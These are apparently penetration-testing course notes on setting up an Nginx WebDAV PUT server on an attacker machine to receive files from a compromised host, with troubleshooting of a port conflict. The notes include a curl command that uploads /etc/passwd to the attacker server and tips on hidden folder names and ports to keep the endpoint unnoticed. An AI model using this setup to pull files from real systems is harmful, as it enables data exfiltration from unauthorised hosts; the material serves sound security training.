## 1. Introduction

Earlier notes covered Python's `uploadserver` module as a quick, no-fuss way to receive uploaded files over HTTP/HTTPS. This section goes a level deeper and covers setting up a production-grade web server — specifically **Nginx** — configured just for receiving file uploads, which is a more deliberate and controlled setup than a quick Python module.

**Machine labels used in this section:**

| Label | Role |
|---|---|
| **HACKER** (a.k.a. Pwnbox) | The machine running the Nginx upload server — this entire section's commands run here |
| **FOOT_HOLD** | The compromised/target machine, which would be the one sending files up to this server |

---

## 2. Why HTTP/S Is the Default Choice

Web transfer is the single most common way to move files during an assessment, for two main reasons:

1. **HTTP/HTTPS are the most commonly allowed outbound protocols through firewalls.** Almost every organization needs its systems to reach the web for normal business purposes, so these ports are rarely locked down as tightly as more unusual protocols.
2. **HTTPS encrypts the file in transit.** This matters more than it might first seem — imagine being on a penetration test, having a client's network intrusion detection system (IDS) flag a sensitive file being sent in plaintext, and then having to explain why a password was transmitted to a cloud server without any encryption at all. Using HTTPS instead of plain HTTP avoids that entire conversation.

## 3. Setting Up Nginx for Uploads

### 3.1 Why Nginx Instead of Apache?

Both Apache and Nginx can serve as upload-capable web servers, but Nginx is the safer default choice here for a specific reason: its configuration is simpler, and its module system is less prone to accidentally introducing security issues.

**The specific danger with Apache:** its PHP module is eager to execute *any* file ending in `.php` that it can serve. If an upload server built on Apache isn't locked down extremely carefully, an attacker (or, in this context, anyone else who discovers the upload endpoint) could upload a malicious PHP file — a **web shell** (a script that lets whoever uploaded it run arbitrary commands on the server through a web interface) — and then simply browse to it, triggering code execution on the server. Nginx, by contrast, doesn't have this "execute anything that looks like PHP" behavior baked in by default, making it meaningfully harder to shoot yourself in the foot.

> **Golden rule when building an HTTP upload server:** be 100% certain that whatever gets uploaded can never be executed by the server. An upload directory should be able to receive files, full stop — not run them.

### 3.2 Step-by-Step Setup

All of the following commands run **on HACKER**, the machine that will host the upload server.

**Step 1 — Create a directory to hold uploaded files.**
```
$ sudo mkdir -p /var/www/uploads/SecretUploadDirectory
```
*`mkdir -p` creates the full nested folder path (`/var/www/uploads/SecretUploadDirectory`) in one go, creating any missing parent folders along the way. Giving the upload folder a non-obvious name like `SecretUploadDirectory` makes it harder for anyone scanning the server to stumble onto it by guessing common folder names.*

**Step 2 — Set the correct file ownership.**
```
$ sudo chown -R www-data:www-data /var/www/uploads/SecretUploadDirectory
```
*`chown -R` recursively changes the owner (and group) of the folder and everything inside it. `www-data` is the standard user account that Nginx (and most web servers on Debian/Ubuntu-based systems) runs as — giving that account ownership ensures the web server process actually has permission to write uploaded files into this folder.*

**Step 3 — Create the Nginx configuration file.**

Create a new file at `/etc/nginx/sites-available/upload.conf` with the following contents:
```
server {
    listen 9001;
    
    location /SecretUploadDirectory/ {
        root    /var/www/uploads;
        dav_methods PUT;
    }
}
```
*`listen 9001` tells this particular server configuration ("server block") to listen on port 9001, rather than the usual port 80 (HTTP) or 443 (HTTPS) — picking a less obvious port is another small step toward keeping this endpoint from being noticed. The `location /SecretUploadDirectory/` block applies specifically to requests for that path. `root /var/www/uploads` tells Nginx where on disk that path maps to (so a request for `/SecretUploadDirectory/file.txt` corresponds to `/var/www/uploads/SecretUploadDirectory/file.txt`). `dav_methods PUT` is the key line — it enables WebDAV's `PUT` method specifically for this location, which is what actually allows files to be *written* here rather than just read. Without this line, the location would only support normal read-only serving.*

**Step 4 — Enable the configuration by symlinking it into the active sites folder.**
```
$ sudo ln -s /etc/nginx/sites-available/upload.conf /etc/nginx/sites-enabled/
```
*Nginx (on Debian/Ubuntu-style setups) only actually loads configuration files that are linked into `/etc/nginx/sites-enabled/` — keeping configs in `sites-available` first and symlinking them into `sites-enabled` only when needed is a common convention for easily turning site configs on and off without deleting them.*

**Step 5 — Restart Nginx so the new configuration takes effect.**
```
$ sudo systemctl restart nginx.service
```
*A restart (rather than a reload) ensures the new server block, including the new listening port, is picked up cleanly.*

### 3.3 Troubleshooting a Port Conflict

If Nginx throws errors on startup, checking its error log is the first move:
```
$ tail -2 /var/log/nginx/error.log

2020/11/17 16:11:56 [emerg] 5679#5679: bind() to 0.0.0.0:`80` failed (98: A`ddress already in use`)
2020/11/17 16:11:56 [emerg] 5679#5679: still could not bind()
```
*`tail -2` shows just the last two lines of the log file — usually enough to catch the most recent error. This particular error says Nginx couldn't "bind" (claim/attach itself) to port 80, because something else is already using it.*

> **Common Pwnbox-specific gotcha:** port 80 is often already occupied by something unrelated — in the example below, it turns out to be a `websockify` process, which is infrastructure used to support the Pwnbox's own browser-based remote desktop access. This has nothing to do with the upload server being configured, but it will still block Nginx's *default* configuration (which also tries to use port 80) from starting.

**Finding out what's using port 80:**
```
$ ss -lnpt | grep 80

LISTEN 0      100          0.0.0.0:80        0.0.0.0:*    users:(("python",pid=`2811`,fd=3),("python",pid=2070,fd=3),("python",pid=1968,fd=3),("python",pid=1856,fd=3))
```
*`ss -lnpt` lists Listening sockets, showing addresses Numerically, with Process info, filtered to TCP only (very similar to the `netstat -lnpt` command used in earlier sections — `ss` is the modern replacement for `netstat` on most current Linux distributions). Piping into `grep 80` narrows the output down to just the line mentioning port 80. The output shows several Python processes bound to that port, with one PID (`2811`) worth investigating further.*

**Confirming what that process actually is:**
```
$ ps -ef | grep 2811

user65      2811    1856  0 16:05 ?        00:00:04 `python -m websockify 80 localhost:5901 -D`
root        6720    2226  0 16:14 pts/0    00:00:00 grep --color=auto 2811
```
*`ps -ef` lists all running processes in full detail, and `grep 2811` filters down to just the one matching that process ID. This confirms the process is `websockify`, bridging port 80 to a local VNC-style service on port 5901 — unrelated to the upload server, but still occupying the port that Nginx's *default* configuration also tries to use.*

**The fix — remove Nginx's default site configuration**, since it's the one still trying to claim port 80 (the custom `upload.conf` configuration created earlier already uses port 9001 instead, so it isn't affected by this conflict at all):
```
$ sudo rm /etc/nginx/sites-enabled/default
```
*This removes the symlink to Nginx's default configuration (which normally listens on port 80), freeing up Nginx to start cleanly without trying to bind to a port that's already taken by something else.*

### 3.4 Uploading a File to Test It

Once Nginx is running with the custom configuration, test that uploads actually work. Run this **on FOOT_HOLD** (or any machine that can reach HACKER on port 9001) to send the local `/etc/passwd` file up to the server, saving it there under the name `users.txt`:
```
$ curl -T /etc/passwd http://localhost:9001/SecretUploadDirectory/users.txt
```
*`curl -T` ("transfer" / upload mode) sends the specified local file using an HTTP `PUT` request — exactly the method enabled in the Nginx configuration's `dav_methods PUT` line. The URL's path matches the `location` block configured earlier, and the final segment of the URL (`users.txt`) becomes the filename the uploaded content is saved under. (Note: `localhost` here assumes this command is run on the same machine as the server, for testing — in a real scenario it would be HACKER's actual IP address.)*

**Confirm, back on HACKER, that the file actually arrived:**
```
$ sudo tail -1 /var/www/uploads/SecretUploadDirectory/users.txt 

user65:x:1000:1000:,,,:/home/user65:/bin/bash
```
*`tail -1` shows just the last line of the uploaded file — enough to confirm it really did contain the expected `/etc/passwd` content and that the upload worked end-to-end.*

### 3.5 Checking Directory Listing Is Disabled

A final, important check: make sure visiting the upload folder directly in a browser doesn't reveal a list of every file inside it. Navigate to `http://localhost/SecretUploadDirectory` (adjusted for whichever port is actually in use) and confirm nothing is displayed.

**Why this matters:** by default, Apache will automatically generate and display a directory listing — a clickable list of every file in a folder — whenever that folder has no `index.html` (or similar) file inside it. For an upload directory whose entire purpose is quietly receiving sensitive, exfiltrated files, that default behavior would be actively harmful: anyone who stumbles onto or guesses the folder's URL could browse and download everything in it. Nginx, true to its minimal design philosophy, doesn't enable automatic directory listing by default, which makes it a safer starting point for exactly this use case.

## 6. Big-Picture Takeaways

1. **HTTP/HTTPS wins by default for two separate reasons.** It's almost always allowed through firewalls, and HTTPS specifically adds encryption in transit — avoiding the embarrassing (and professionally damaging) scenario of a client's IDS catching sensitive data sent in plaintext.
2. **Tool choice is itself a security decision, not just a technical preference.** Picking Nginx over Apache here isn't about performance or personal taste — it's specifically because Apache's default PHP handling makes it easier to accidentally create a web shell upload vector, while Nginx's simpler design avoids that trap by default.
3. **An upload directory should only ever do one job: receive files.** The entire setup — WebDAV's `PUT` method, careful ownership, disabled directory listings — is built around the principle that whatever gets uploaded must never be executable or browsable by anyone else.
4. **Port conflicts are often unrelated to the task at hand.** The Pwnbox example shows a completely unrelated service (`websockify`, supporting remote desktop access) blocking port 80 — a reminder that `ss`/`netstat` plus `ps` are essential first steps whenever a server fails to start, rather than assuming the new configuration itself is broken.
5. **Obscurity is a nice-to-have, not a substitute for proper controls.** Using a non-default port (9001) and a non-obvious folder name (`SecretUploadDirectory`) make the endpoint slightly harder to stumble upon, but the real protection comes from disabling directory listings and ensuring uploaded files can't be executed.
6. **Testing an upload path is just as important as building it.** The `curl -T` test and the follow-up `tail` check confirm the entire chain — configuration, permissions, and the WebDAV `PUT` method — actually works end-to-end, rather than assuming it does just because Nginx started without errors.
